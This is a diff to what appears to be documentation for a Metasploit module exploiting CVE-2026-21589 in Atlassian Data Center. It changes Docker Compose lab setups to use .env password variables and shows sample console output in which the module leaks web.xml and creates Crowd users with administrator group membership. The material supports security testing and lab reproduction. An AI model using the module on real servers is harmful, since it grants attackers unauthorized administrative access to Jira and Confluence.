@@ -55,8 +55,15 @@ network.
 
 #### Confluence and Crowd
 
-1. Save this content as `compose.yml` and replace
-   `<confluence-db-password>`:
+Create `.env` beside `compose.yml`. Replace the empty value with a disposable
+database password before continuing:
+
+```dotenv
+# Use only ASCII letters, digits, underscores, and hyphens.
+CONFLUENCE_DB_PASSWORD=
+```
+
+1. Save this content as `compose.yml`:
 
 ```yaml
 services:
@@ -65,7 +72,7 @@ services:
     environment:
       POSTGRES_DB: confluence
       POSTGRES_USER: confluence
-      POSTGRES_PASSWORD: <confluence-db-password>
+      POSTGRES_PASSWORD: ${CONFLUENCE_DB_PASSWORD:?Set CONFLUENCE_DB_PASSWORD to a non-empty value}
     healthcheck:
       test: ["CMD-SHELL", "pg_isready -U confluence -d confluence"]
       interval: 5s
@@ -86,7 +93,7 @@ services:
       ATL_DB_TYPE: postgresql
       ATL_JDBC_URL: jdbc:postgresql://confluence-db:5432/confluence
       ATL_JDBC_USER: confluence
-      ATL_JDBC_PASSWORD: <confluence-db-password>
+      ATL_JDBC_PASSWORD: ${CONFLUENCE_DB_PASSWORD:?Set CONFLUENCE_DB_PASSWORD to a non-empty value}
       JVM_MINIMUM_MEMORY: 1g
       JVM_MAXIMUM_MEMORY: 2g
     ports:
@@ -205,7 +212,15 @@ docker compose up --detach --force-recreate confluence
 
 #### Jira and Crowd
 
-1. Save this content as `compose.yml` and replace `<jira-db-password>`:
+Create `.env` beside `compose.yml`. Replace the empty value with a disposable
+database password before continuing:
+
+```dotenv
+# Use only ASCII letters, digits, underscores, and hyphens.
+JIRA_DB_PASSWORD=
+```
+
+1. Save this content as `compose.yml`:
 
 ```yaml
 services:
@@ -214,7 +229,7 @@ services:
     environment:
       POSTGRES_DB: jira
       POSTGRES_USER: jira
-      POSTGRES_PASSWORD: <jira-db-password>
+      POSTGRES_PASSWORD: ${JIRA_DB_PASSWORD:?Set JIRA_DB_PASSWORD to a non-empty value}
     healthcheck:
       test: ["CMD-SHELL", "pg_isready -U jira -d jira"]
       interval: 5s
@@ -236,7 +251,7 @@ services:
       ATL_DB_DRIVER: org.postgresql.Driver
       ATL_JDBC_URL: jdbc:postgresql://jira-db:5432/jira
       ATL_JDBC_USER: jira
-      ATL_JDBC_PASSWORD: <jira-db-password>
+      ATL_JDBC_PASSWORD: ${JIRA_DB_PASSWORD:?Set JIRA_DB_PASSWORD to a non-empty value}
       JVM_MINIMUM_MEMORY: 1g
       JVM_MAXIMUM_MEMORY: 2g
     ports:
@@ -301,8 +316,15 @@ docker compose logs --follow jira crowd
 
 #### Bitbucket
 
-1. Save this content as `compose.yml` and replace
-   `<bitbucket-db-password>`:
+Create `.env` beside `compose.yml`. Replace the empty value with a disposable
+database password before continuing:
+
+```dotenv
+# Use only ASCII letters, digits, underscores, and hyphens.
+BITBUCKET_DB_PASSWORD=
+```
+
+1. Save this content as `compose.yml`:
 
 ```yaml
 services:
@@ -311,7 +333,7 @@ services:
     environment:
       POSTGRES_DB: bitbucket
       POSTGRES_USER: bitbucket
-      POSTGRES_PASSWORD: <bitbucket-db-password>
+      POSTGRES_PASSWORD: ${BITBUCKET_DB_PASSWORD:?Set BITBUCKET_DB_PASSWORD to a non-empty value}
     healthcheck:
       test: ["CMD-SHELL", "pg_isready -U bitbucket -d bitbucket"]
       interval: 5s
@@ -329,7 +351,7 @@ services:
       JDBC_DRIVER: org.postgresql.Driver
       JDBC_URL: jdbc:postgresql://bitbucket-db:5432/bitbucket?targetServerType=master
       JDBC_USER: bitbucket
-      JDBC_PASSWORD: <bitbucket-db-password>
+      JDBC_PASSWORD: ${BITBUCKET_DB_PASSWORD:?Set BITBUCKET_DB_PASSWORD to a non-empty value}
       JVM_MINIMUM_MEMORY: 1g
       JVM_MAXIMUM_MEMORY: 2g
     ports:
@@ -425,6 +447,8 @@ existing username.
 
 Set the password assigned to the created Crowd user. This option only applies
 to `CREATE_USER` and has a random 16-character default.
+After `CREATE_USER` succeeds and the target synchronizes its Crowd directory,
+use the printed username and this password to sign in to Jira or Confluence.
 
 ### ADMIN_GROUP
 
@@ -474,7 +498,7 @@ msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > run verbose=tru
 [+] The target is vulnerable. Atlassian Confluence 10.2.18 disclosed WEB-INF/web.xml; CREATE_USER found usable Crowd integration settings, but Crowd reachability and write permissions remain unverified
 [*] Using Crowd endpoint http://127.0.0.1:8095/crowd/
 [*] Creating Crowd user 'zack.maggio'
-[+] Created Crowd user 'zack.maggio'; its password is stored in PASSWORD
+[+] Created Crowd user 'zack.maggio' for signing in to Atlassian Confluence; its password is stored in PASSWORD
 [*] Adding Crowd user 'zack.maggio' to 'confluence-administrators'
 [+] Crowd user 'zack.maggio' is a direct member of 'confluence-administrators'
 [*] The target application may require a Crowd directory synchronization before the membership becomes active
@@ -590,7 +614,7 @@ msf auxiliary(admin/http/atlassian_data_center_cve_2026_21589) > run verbose=tru
 [*] Using Crowd endpoint http://127.0.0.1:8095/crowd/
 [*] Creating Crowd group 'jira-administrators'
 [*] Creating Crowd user 'audria_koch'
-[+] Created Crowd user 'audria_koch'; its password is stored in PASSWORD
+[+] Created Crowd user 'audria_koch' for signing in to Atlassian Jira; its password is stored in PASSWORD
 [*] Adding Crowd user 'audria_koch' to 'jira-administrators'
 [+] Crowd user 'audria_koch' is a direct member of 'jira-administrators'
 [*] The target application may require a Crowd directory synchronization before the membership becomes active
